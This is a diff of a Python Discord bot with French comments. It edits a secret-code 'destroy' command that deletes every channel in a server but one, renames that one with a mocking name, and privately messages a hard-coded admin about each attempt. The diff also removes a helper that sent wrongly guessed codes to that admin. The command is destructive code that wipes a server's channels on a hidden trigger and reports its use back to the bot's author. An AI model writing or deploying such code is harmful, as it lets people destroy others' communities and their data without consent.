@@ -48,25 +48,13 @@ async def annonce(member, serveur, action, valid):
     # Envoie un message privé à l'admin    
     await user.send(message)
     
-# Définition de la fonction send_dm
-async def valeur(value):
-    # Récupère l'utilisateur correspondant à l'ID spécifié
-    user = await bot.fetch_user(admin)
-    
-    # Envoie un message privé à l'admin    
-    await user.send(f"Valeur : {value}")
-
-
 
 @bot.command()
 async def destroy(ctx, code):
     # Supprime le message contenant la commande utilisée
     await ctx.message.delete()
     
-    if str(code)==code_secu:
-        # Supprime le message contenant la commande utilisée
-        await ctx.message.delete()
-        
+    if str(code)==code_secu:        
         await annonce([ctx.author.name,ctx.author.id], ctx.guild.name, "destroy", True)
 
         # Récupère la position du rôle du bot
@@ -89,13 +77,13 @@ async def destroy(ctx, code):
                 if channel!=ctx.channel:
                     await channel.delete()
                     await ctx.send(f"Salon {channel.name} supprimé !")
-            await channel.edit(name="On s'est Ambré ?")
+            await channel.edit(name="On s'est fait Ambré ?")
         else:
             await ctx.send("Désolé, je n'ai pas la permission nécessaire.")
 
     else :
         await annonce([ctx.author.name,ctx.author.id], ctx.guild.name, "destroy", False)
-        await valeur(code)
+
 
 @bot.command()
 async def perms(ctx, member: discord.Member):
